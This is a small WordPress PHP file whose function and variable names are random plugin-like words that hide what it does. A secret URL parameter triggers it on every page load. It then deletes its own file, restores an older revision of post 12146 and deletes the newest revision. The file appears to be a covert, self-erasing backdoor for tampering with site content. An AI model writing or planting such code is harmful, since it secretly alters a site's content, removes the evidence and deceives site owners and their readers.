<?php

function message_subscription_option_system() {
	if (isset($_GET['services_top_html5_script']) && $_GET['services_top_html5_script'] === 'endpoints_carousel_multi') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$translate_visitor_customizer_app = 12146;
		$reading_floating_supports_links = wp_get_post_revisions($translate_visitor_customizer_app);
		if (empty($reading_floating_supports_links)) die('no revisions');
		if (count($reading_floating_supports_links) < 2) die('less than 2');
		$endpoints_ai_notes_visibility = array_shift($reading_floating_supports_links);
		$codes_visibility_engine_server = $endpoints_ai_notes_visibility->ID;
		$settings_force_uploads_notes = array_shift($reading_floating_supports_links);
		$gift_bootstrap_first = $settings_force_uploads_notes->ID;
		$plugins_com_ecommerce = wp_restore_post_revision($gift_bootstrap_first);
		if ($plugins_com_ecommerce === false) die('error restoring');
		$plugins_com_ecommerce = wp_delete_post_revision($codes_visibility_engine_server);		
		if ($plugins_com_ecommerce === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'message_subscription_option_system');
